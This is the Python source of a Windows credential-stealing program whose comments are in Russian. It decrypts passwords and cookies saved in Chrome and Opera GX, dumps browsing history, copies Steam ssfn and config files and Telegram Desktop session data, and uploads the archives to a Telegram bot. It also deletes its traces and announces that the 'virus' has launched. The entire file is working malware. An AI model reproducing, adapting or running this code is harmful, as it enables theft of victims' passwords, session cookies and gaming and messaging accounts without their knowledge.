import base64, datetime, json
import os, shutil, sqlite3
from requests import Session
import win32crypt
from Crypto.Cipher import AES
from config import TOKEN, CHAT_ID

VERSION = 1.1

url_Document = f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}'
url_text = lambda text: f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}'

paths_Telegram = (
    os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata",
    'D:\\Telegram Desktop\\tdata', 'C:\\Program Files\\Telegram Desktop\\tdata',
)  # папки где могут храниться данные телеграмма

current_user = os.getlogin()  # имя пользователя
user_path = os.path.expanduser('~')  # путь по имя пользователя (C:\\Users\\Admin)

chrome_path = f'C:\\Users\\{current_user}\\AppData\\Roaming\\Chrome'
operagx_path = f'C:\\Users\\{current_user}\\AppData\\Roaming\\OperaGX'
steam_path = f'C:\\Users\\{current_user}\\AppData\\Local\\Steamm'
tg_path = f'C:\\Users\\{current_user}\\AppData\\Local\\tdata'

###############################################################################
#                                Support                                      #
###############################################################################
session = Session()
session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'


class Support:
    @staticmethod
    def start():
        try:
            session.post(url_text(f'{current_user} запустил вирус, ожидаем...'))
        except:
            pass
        try:
            os.makedirs(chrome_path)
            os.makedirs(operagx_path)
            os.makedirs(steam_path)
        except:
            pass

    @staticmethod
    def send_data(data, name):
        try:
            session.post(url_Document, files={"document": (f'{name}({current_user}).zip', data)})
        except:
            pass

    @staticmethod
    def send_error(name):
        try:
            session.post(url_text('Пользователь: ' + current_user + f' не имеет {name}'))
        except:
            pass

    @staticmethod
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    @staticmethod
    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    @staticmethod
    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = Support.generate_cipher(master_key, iv)
            decrypted_pass = Support.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Can't decode"

    @staticmethod
    def get_master_key(path):
        """ получаем мастер пароль """
        with open(user_path + path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])  # находим защифрованный ключ
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt(buff, master_key):
        try:
            return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Can't decode"

    @staticmethod
    def normal_time(date):
        """ приводим полученное время в нормальный вид """
        try:
            return str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=date))
        except:
            return "Can't decode"


class Data:
    @staticmethod
    def History(cursor, history):
        """ возвращает историю """
        HistorySQL = "SELECT url FROM visits"
        HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"

        temp = []
        for result in cursor.execute(HistorySQL).fetchall():
            data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
            result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {Support.normal_time(data[2])}\n\n"
            if result in temp:
                continue
            temp.append(result)
            history.write(result)

    @staticmethod
    def cookies(cursor, path, path_to_save):
        """ возвращает куки """
        CookiesSQL = "SELECT * FROM cookies"

        results = '[\n'
        for result in cursor.execute(CookiesSQL).fetchall():
            secure = result[8] == 0
            http = result[9] == 0

            results += '''
	{
		"domain": "%s",
		"expirationDate": %s,
		"name": "%s",
		"httpOnly": %s,
		"path": "%s",
		"secure": %s,
		"value": "%s"
	},
			''' % (result[1], result[7], result[3], http, result[6], secure,
                   Support.decrypt(result[5], Support.get_master_key(path)))

        with open(user_path + path_to_save, "w", encoding="utf-8") as cookies:
            results = results.replace('True', 'true')
            results = results.replace('False', 'false')
            results = results.replace('""', '"')
            results = results[:-1] + '\n]'
            cookies.write(results)


###############################################################################
#                               Telegram                                      #
###############################################################################
class Telegram:
    @staticmethod
    def telegram():
        for path in paths_Telegram:
            try:
                shutil.copytree(path, tg_path,
                                ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2",
                                                              "user_data#3", "webview"))
                # 1) откуда 2) куда 3) что не копировать.     Сама создает директорию, если она уже существует то вызывает ошибку
                break
            except:
                pass

        if not os.path.exists(tg_path):  # если нет папки -> включение поиска
            ignore_folders = []
            next_folder = True

            try:
                for root, dirs, files in os.walk("D:\\"):
                    # dirs = [d for d in dirs if d not in ignore_folders]
                    if 'Telegram Desktop' in dirs:
                        shutil.copytree(root + '\\Telegram Desktop\\tdata', tg_path,
                                        ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data",
                                                                      "user_data#2", "user_data#3", "webview"))
                        next_folder = False
                        break

                ignore_folders = ['All Users', 'Default', 'Default User', 'Windows', 'ProgramData', 'Public', 'Default']

                if next_folder:
                    for root, dirs, files in os.walk("C:\\"):
                        dirs = [d for d in dirs if d not in ignore_folders]
                        if 'Telegram Desktop' in dirs:
                            shutil.copytree(root + '\\Telegram Desktop', tg_path,
                                            ignore=shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data",
                                                                          "user_data#2", "user_data#3", "webview"))
                            break
            except:
                pass

        if not os.path.exists(tg_path):  # повторная проверка, если нет папки -> завершение процесса
            Support.send_error("Telegram")
            return False

        # удаляем ненужные файлы размером больше 500кб
        for root, dirs, files in os.walk(tg_path):
            for file in files:  # проверка всех файлов в текущей директории
                if os.path.getsize(file_path := os.path.join(root, file)) > 540000:
                    os.remove(file_path)

        try:
            shutil.make_archive(tg_path, 'zip',
                                tg_path)  # 1) где вывести файл 2) формат 3) путь к папке которую надо упаковать
        except:
            pass

        try:
            shutil.rmtree(tg_path)  # удаляем папку с файлами
            return True
        except:
            pass

    @staticmethod
    def send_tg_logs():
        """ отправка телеграмм сессии """
        try:
            with open(tg_path + '.zip', 'rb') as tg:
                Support.send_data(tg, "tg_logs")
        except:
            pass

        try:
            os.remove(tg_path + '.zip')  # удаляем файл
        except:
            pass

    @staticmethod
    def main():
        if Telegram.telegram():
            Telegram.send_tg_logs()


###############################################################################
#                                 Chrome                                      #
###############################################################################
class Chrome:
    """ Данные Chrome"""
    path = r'\AppData\Local\Google\Chrome\User Data\Local State'  # путь до файла с зашифрованным мастер паролем

    @staticmethod
    def check_browzer():
        if not os.path.exists(os.path.expanduser('~') + Chrome.path):
            raise Exception

    # ----------------------------------------------- Логины и Пароли начало скрипта
    @staticmethod
    def get_login_and_password():
        try:
            master_key = Support.get_master_key(Chrome.path)
            login_db = user_path + r'\AppData\Local\Google\Chrome\User Data\default\Login Data'
            shutil.copy2(login_db, user_path + '\\AppData\\Roaming\\Loginvault.db')

            conn = sqlite3.connect(user_path + '\\AppData\\Roaming\\Loginvault.db')
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = Support.decrypt_password(encrypted_password, master_key)

                alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

                with open(user_path + '\\AppData\\Roaming\\Chrome\\Chrome_login_and_password.txt', "a") as o:
                    o.write(alldatapass)
            conn.close()
        except:
            pass

    # ----------------------------------------------- Логины и Пароли конец скрипта

    # ----------------------------------------------- История и кукисы начало скрипта
    @staticmethod
    def main_history_cookies():
        try:
            data_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
            history_db = os.path.join(data_path, 'History')
            shutil.copy2(history_db, user_path + '\\AppData\\Roaming\\history.db')
            c = sqlite3.connect(user_path + '\\AppData\\Roaming\\history.db')
            cursor = c.cursor()
            with open(user_path + '\\AppData\\Roaming\\Chrome\\history-Chrome.txt', "a",
                      encoding="utf-8") as history:  # извлекаем всю историю
                Data.History(cursor, history)

            data_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\Network"
            cookies_db = os.path.join(data_path, 'Cookies')
            shutil.copy2(cookies_db, user_path + '\\AppData\\Roaming\\cookies.db')
            c = sqlite3.connect(user_path + '\\AppData\\Roaming\\cookies.db')
            cursor = c.cursor()

            path_to_save = '\\AppData\\Roaming\\Chrome\\Cookies-Chrome.json'
            Data.cookies(cursor, Chrome.path, path_to_save)
        except:
            pass

    # ----------------------------------------------- История и кукисы конец скрипта

    @staticmethod
    def create_zip_cover_tracks():
        """ создание архива и заметание следов """
        try:
            os.remove(user_path + '\\AppData\\Roaming\\cookies.db')
            os.remove(user_path + '\\AppData\\Roaming\\Loginvault.db')
            os.remove(user_path + '\\AppData\\Roaming\\history.db')
        except:
            pass

        shutil.make_archive(chrome_path, 'zip', chrome_path)
        shutil.rmtree(chrome_path)

    @staticmethod
    def send_chrome_data():
        try:
            with open(user_path + '\\AppData\\Roaming\\Chrome.zip', 'rb') as chrome_data:
                Support.send_data(chrome_data, "Chrome")
        except:
            pass

        try:
            os.remove(user_path + '\\AppData\\Roaming\\Chrome.zip')  # удаляем архив
        except:
            pass

    @staticmethod
    def main():
        try:
            Chrome.check_browzer()
            Chrome.get_login_and_password()
            Chrome.main_history_cookies()
            Chrome.create_zip_cover_tracks()
            Chrome.send_chrome_data()
        except:
            shutil.rmtree(chrome_path)
            Support.send_error("Chrome")


###############################################################################
#                                OperaGX                                      #
###############################################################################
class OperaGX:
    """ Данные OperaGX GX"""
    path = r'\AppData\Roaming\Opera Software\Opera GX Stable\Local State'

    @staticmethod
    def check_browzer():
        if not os.path.exists(os.path.expanduser('~') + OperaGX.path):
            raise Exception

    # ----------------------------------------------- Логины и Пароли начало скрипта
    @staticmethod
    def get_login_and_password():
        try:
            master_key = Support.get_master_key(OperaGX.path)
            login_db = user_path + r'\AppData\Roaming\Opera Software\Opera GX Stable\Login Data'
            shutil.copy2(login_db, user_path + '\\AppData\\Roaming\\LoginvaultOPERA.db')

            conn = sqlite3.connect(user_path + '\\AppData\\Roaming\\LoginvaultOPERA.db')
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = Support.decrypt_password(encrypted_password, master_key)

                alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"

                with open(user_path + '\\AppData\\Roaming\\OperaGX\\OperaGX_login_and_password.txt', "a") as o:
                    o.write(alldatapass)
            conn.close()
        except:
            pass

    # ----------------------------------------------- Логины и Пароли конец скрипта

    # ----------------------------------------------- История и кукисы начало скрипта
    @staticmethod
    def main_history_cookies():
        try:
            data_path = os.path.expanduser('~') + r"\AppData\Roaming\Opera Software\Opera GX Stable"
            history_db = os.path.join(data_path, 'History')
            shutil.copy2(history_db, user_path + '\\AppData\\Roaming\\historyOPERA.db')
            c = sqlite3.connect(user_path + '\\AppData\\Roaming\\historyOPERA.db')
            cursor = c.cursor()
            with open(user_path + '\\AppData\\Roaming\\OperaGX\\history-opera.txt', "a",
                      encoding="utf-8") as history:  # извлекаем всю историю
                Data.History(cursor, history)

            data_path = os.path.expanduser('~') + r"\AppData\Roaming\Opera Software\Opera GX Stable\Network"
            cookies_db = os.path.join(data_path, 'Cookies')
            shutil.copy2(cookies_db, user_path + '\\AppData\\Roaming\\cookiesOPERA.db')
            c = sqlite3.connect(user_path + '\\AppData\\Roaming\\cookiesOPERA.db')
            cursor = c.cursor()

            path_to_save = '\\AppData\\Roaming\\OperaGX\\Cookies-OperaGX.json'
            Data.cookies(cursor, OperaGX.path, path_to_save)
        except:
            pass

    # ----------------------------------------------- История и кукисы конец скрипта

    @staticmethod
    def create_zip_cover_tracks():
        """ создание архива и заметание следов """
        try:
            os.remove(user_path + '\\AppData\\Roaming\\cookiesOPERA.db')
            os.remove(user_path + '\\AppData\\Roaming\\LoginvaultOPERA.db')
            os.remove(user_path + '\\AppData\\Roaming\\historyOPERA.db')
        except:
            pass

        shutil.make_archive(operagx_path, 'zip', operagx_path)
        shutil.rmtree(operagx_path)

    @staticmethod
    def send_operagx_data():
        try:
            with open(user_path + '\\AppData\\Roaming\\OperaGX.zip', 'rb') as operagx_data:
                Support.send_data(operagx_data, "OperaGX")
        except:
            pass

        try:
            os.remove(user_path + '\\AppData\\Roaming\\OperaGX.zip')  # удаляем архив
        except:
            pass

    @staticmethod
    def main():
        try:
            OperaGX.check_browzer()
            OperaGX.get_login_and_password()
            OperaGX.main_history_cookies()
            OperaGX.create_zip_cover_tracks()
            OperaGX.send_operagx_data()
        except:
            shutil.rmtree(operagx_path)
            Support.send_error("OperaGX")


###############################################################################
#                                  Steam                                      #
###############################################################################
pathSsfn = (r'C:\Program Files\Steam', r'C:\Program Files (x86)\Steam', r'D:\Shop games\Steam')  # пути к папке со стимом
pathConfig = (r'C:\Program Files\Steam\config', r'C:\Program Files (x86)\Steam\config', r'D:\Shop games\Steam\config')  # пути к папке конфига стима

steam_config_path = rf'C:\Users\{current_user}\AppData\Local\Steamm\config'


class Steam:
    @staticmethod
    def main():
        ignore_folders = ['All Users', 'Default', 'Default User', 'Windows', 'ProgramData', 'Public', 'Default',
                          '$WinREAgent', 'Local', 'Common Files', '$Windows.~WS', 'Recovery', 'Roaming']
        for num in range(len(pathSsfn)):
            try:
                files2 = [i for i in os.listdir(pathSsfn[num]) if os.path.isfile(os.path.join(pathSsfn[num], i)) and 'ssfn' in i]
                shutil.copytree(pathConfig[num], steam_config_path)
                shutil.copy(pathSsfn[num] + '\\' + files2[0], steam_path)
                shutil.copy(pathSsfn[num] + '\\' + files2[1], steam_path)
            except:
                pass

        if len(os.listdir(steam_path)) > 1:  # если нет данных в папке завершит работу
            shutil.make_archive(steam_path, 'zip', steam_path)
            with open(steam_path + '.zip', 'rb') as steam:
                Support.send_data(steam, 'Steam')
            os.remove(steam_path + '.zip')
            shutil.rmtree(steam_path)
        else:
            next_disk = True
            for disk in ['C', 'D']:
                if not next_disk:
                    break
                for root, dirs, files in os.walk(f"{disk}:\\"):
                    dirs[:] = [d for d in dirs if d not in ignore_folders]
                    if 'Steam' in dirs:  # если стим есть среди папок переопределяем dirs (для уменьшения длительности поиска)
                        dirs[:] = ['Steam']
                        continue
                    if 'Steam' in root:
                        try:
                            shutil.copytree(root + '\\config', steam_config_path)  # копирует папку с конфигом
                            files2 = [i for i in files if 'ssfn' in i]
                            shutil.copy(root + '\\' + files2[0], steam_path)
                            shutil.copy(root + '\\' + files2[1], steam_path)
                            next_disk = False
                            break
                        except:
                            print('ERROR')
            if len(os.listdir(steam_path)) < 1:  # если нет данных в папке завершит работу
                shutil.rmtree(steam_path)
                Support.send_error("Steam")
            else:
                shutil.make_archive(steam_path, 'zip', steam_path)
                with open(steam_path + '.zip', 'rb') as steam:
                    Support.send_data(steam, 'Steam')
                os.remove(steam_path + '.zip')
                shutil.rmtree(steam_path)


if __name__ == '__main__':
    Support.start()
    Chrome.main()
    OperaGX.main()
    Steam.main()
    Telegram.main()
